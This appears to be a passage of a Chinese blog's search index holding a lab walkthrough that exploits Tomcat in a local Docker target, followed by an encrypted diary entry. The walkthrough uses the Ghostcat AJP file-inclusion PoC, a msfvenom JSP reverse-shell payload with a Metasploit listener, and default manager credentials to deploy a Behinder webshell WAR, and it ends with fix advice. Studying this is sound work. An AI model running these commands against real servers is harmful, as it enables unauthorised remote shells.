+<h3 id="上面配置完毕之后，接下来就可以切换版本了-根据对应数字输入即可进行切换"><a href="#上面配置完毕之后，接下来就可以切换版本了-根据对应数字输入即可进行切换" class="headerlink" title="上面配置完毕之后，接下来就可以切换版本了(根据对应数字输入即可进行切换)"></a>上面配置完毕之后，接下来就可以切换版本了(根据对应数字输入即可进行切换)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> update-alternatives --config python</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-6.png"></p>
+<h3 id="查看此时的版本看是否切换成功"><a href="#查看此时的版本看是否切换成功" class="headerlink" title="查看此时的版本看是否切换成功"></a>查看此时的版本看是否切换成功</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> python --version</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-7.png"></p>
+<h3 id="此时我们的版本已经成功切换成2-x，再次查看web-xml文件看是否能够查看"><a href="#此时我们的版本已经成功切换成2-x，再次查看web-xml文件看是否能够查看" class="headerlink" title="此时我们的版本已经成功切换成2.x，再次查看web.xml文件看是否能够查看"></a>此时我们的版本已经成功切换成2.x，再次查看web.xml文件看是否能够查看</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.74.130 -p 8009 -f /WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-4-8.png"></p>
+<blockquote>
+<p>此时攻击机器可以成功看到文件，证明确实存在文件包含漏洞</p>
+</blockquote>
+<h2 id="漏洞利用getshell"><a href="#漏洞利用getshell" class="headerlink" title="漏洞利用getshell"></a>漏洞利用getshell</h2><blockquote>
+<p>想要getshell则网站需要有文件上传的地方，这个靶场没有这个功能，不过我们可以模拟一下这个过程，我们手动复制木马文件到靶场服务器来模拟getshell过程</p>
+</blockquote>
+<blockquote>
+<p>注：真实环境中，在攻击器上生成木马，通过漏洞上传过去的，我在这里直接靶机 192.168.74.130上生成，复制到服务器目录中</p>
+</blockquote>
+<h3 id="Kali生成Java木马文件"><a href="#Kali生成Java木马文件" class="headerlink" title="Kali生成Java木马文件"></a>Kali生成Java木马文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.74.142 LPORT=4444 -f raw &gt; shell.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-1.png"></p>
+<h3 id="复制该木马文件到docker容器中复制该木马文件到docker容器中"><a href="#复制该木马文件到docker容器中复制该木马文件到docker容器中" class="headerlink" title="复制该木马文件到docker容器中复制该木马文件到docker容器中"></a>复制该木马文件到docker容器中复制该木马文件到docker容器中</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker <span class="built_in">cp</span> shell.txt facb1f38316c:/usr/local/tomcat/webapps/ROOT/WEB-INF/</span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-2.png"></p>
+<h3 id="回到攻击机器上"><a href="#回到攻击机器上" class="headerlink" title="回到攻击机器上"></a>回到攻击机器上</h3><blockquote>
+<p>通过之前下载的POC访问一下，发现成功读取到了内容，但是我们目的是getshell,需要让反向shell执行才行</p>
+</blockquote>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-3.png"></p>
+<h3 id="先进入到msfconsole"><a href="#先进入到msfconsole" class="headerlink" title="先进入到msfconsole"></a>先进入到msfconsole</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> use exploit/multi/handler</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">set</span> payload java/jsp_shell_reverse_tcp</span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">set</span> lhost 192.168.74.142 <span class="comment">## 攻击器IP</span></span><br><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">set</span> lport 4444  <span class="comment">## 攻击器需要监听的端口（跟生成反向shell时设置的端口一样）</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-4.png"></p>
+<blockquote>
+<p>开启监听成功</p>
+</blockquote>
+<h3 id="攻击主机访问木马文件，并编译执行，反向连接我们攻击主机"><a href="#攻击主机访问木马文件，并编译执行，反向连接我们攻击主机" class="headerlink" title="攻击主机访问木马文件，并编译执行，反向连接我们攻击主机"></a>攻击主机访问木马文件，并编译执行，反向连接我们攻击主机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> python2 <span class="string">&#x27;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&#x27;</span> -p 8009 -f /WEB-INF/shell.txt 192.168.74.130</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：这俩文件作用不一样，’Tomcat-ROOT路径下文件包含….’是用来编译执行服务器代码，执行反向shell用的这个，也就是上面一步，让木马执行反向连接我们电脑而Tomcat-ROOT路径下文件读取….’单纯的读取文件内容，而不会编译执行</p>
+</blockquote>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-5.png"></p>
+<blockquote>
+<p>说明服务器上上传的反向木马编译执行了成功拿到shell！</p>
+</blockquote>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-5-5-6.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">漏洞修复：</span><br><span class="line">1、将 Tomcat立即升级到9.0.31、8.5.51或7.0.100版本进行修复</span><br><span class="line">2、禁用AJP协议</span><br><span class="line">具体方法：</span><br><span class="line">编辑/conf/server.xml，找到如下行：</span><br><span class="line">&lt;Connector port=<span class="string">&quot;8009&quot;</span>protocol=<span class="string">&quot;AJP/1.3&quot;</span> redirectPort=<span class="string">&quot;8443&quot;</span> /&gt;</span><br><span class="line">注释或删除</span><br><span class="line">3、配置 secret来设置AJP协议的认证凭证。</span><br></pre></td></tr></table></figure>
+<h1 id="弱口令war远程部署"><a href="#弱口令war远程部署" class="headerlink" title="弱口令war远程部署"></a>弱口令war远程部署</h1><blockquote>
+<p>漏洞原理：在tomcat8环境下默认进入后台的密码为tomcat&#x2F;tomcat，未修改造成未授权即可进入后台</p>
+</blockquote>
+<h2 id="进入tomcat8的docker环境"><a href="#进入tomcat8的docker环境" class="headerlink" title="进入tomcat8的docker环境"></a>进入tomcat8的docker环境</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-1.png"></p>
+<h2 id="访问后台管理地址，使用tomcat-tomcat进入后台"><a href="#访问后台管理地址，使用tomcat-tomcat进入后台" class="headerlink" title="访问后台管理地址，使用tomcat&#x2F;tomcat进入后台"></a>访问后台管理地址，使用tomcat&#x2F;tomcat进入后台</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-2.png"></p>
+<h2 id="成功进入后台管理界面，看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外"><a href="#成功进入后台管理界面，看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外" class="headerlink" title="成功进入后台管理界面，看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外"></a>成功进入后台管理界面，看到这里有一个上传war包的地方，这里很多java的中间件都可以用war远程部署来拿shell，tomcat也不例外</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-3.png"></p>
+<h2 id="我们将冰蝎生成的jsp文件打包成test-war"><a href="#我们将冰蝎生成的jsp文件打包成test-war" class="headerlink" title="我们将冰蝎生成的jsp文件打包成test.war"></a>我们将冰蝎生成的jsp文件打包成test.war</h2><blockquote>
+<p>war包是用来进行Web开发时一个网站项目下的所有代码，包括前台HTML&#x2F;CSS&#x2F;JS代码，以及后台 JavaWeb的代码。当开发人员开发完毕时，就会将源码打包给测试人员测试，测试完后若要发布则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录，当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署</p>
+</blockquote>
+<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-4.png"></p>
+<h2 id="点击上传即可看到上传的test-war已经部署成功"><a href="#点击上传即可看到上传的test-war已经部署成功" class="headerlink" title="点击上传即可看到上传的test.war已经部署成功"></a>点击上传即可看到上传的test.war已经部署成功</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-5.png"></p>
+<h2 id="尝试访问一下没有报错404，那么已经上传成功"><a href="#尝试访问一下没有报错404，那么已经上传成功" class="headerlink" title="尝试访问一下没有报错404，那么已经上传成功"></a>尝试访问一下没有报错404，那么已经上传成功</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-6.png"></p>
+<h2 id="使用冰蝎进行连接即可拿到shell"><a href="#使用冰蝎进行连接即可拿到shell" class="headerlink" title="使用冰蝎进行连接即可拿到shell"></a>使用冰蝎进行连接即可拿到shell</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/tomcatBugPost/TomcatBug/2-6-7.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修复建议：</span><br><span class="line">1、在系统上以低权限运行 Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）</span><br><span class="line">2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。</span><br><span class="line">在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制</span><br><span class="line">3、以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制</span><br></pre></td></tr></table></figure>
+<table><tr><td bgcolor=yellow>
+至此，所有实验已完成，这是作为小白的一个小小记录，如果有帮助到你，我很开心，大佬勿喷~
+当然如果对此文有问题可随时联系我哦~~~
+</td></tr></table>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>Tomcat</tag>
+        <tag>Docker</tag>
+        <tag>kali</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>小秘密</title>
+    <url>/2023/12/07/jiami/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="43bb802e48a33ab15a32a884293f65c651cfd5d4a7f79a011f6be55590ed401b">8857952509ef9895f61625fe2d594ef3d2b4f7593e8bb6b35b58b5c43dfd25b5dcaeb26d897cae06a64ff10ea8760a443930ece31786a06debb73ae39335c092b04c209fac4fd7a378ca5a4518be361a99a5957ec3e1c1b8d77756f91a5ed9524fd646e7f04a8ba1609017209b84a84b</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-xray">
+      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>
+      </label>
+      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
+        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
+        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
+      </svg>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>我的心里话</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
+      </tags>
+  </entry>
+</search>
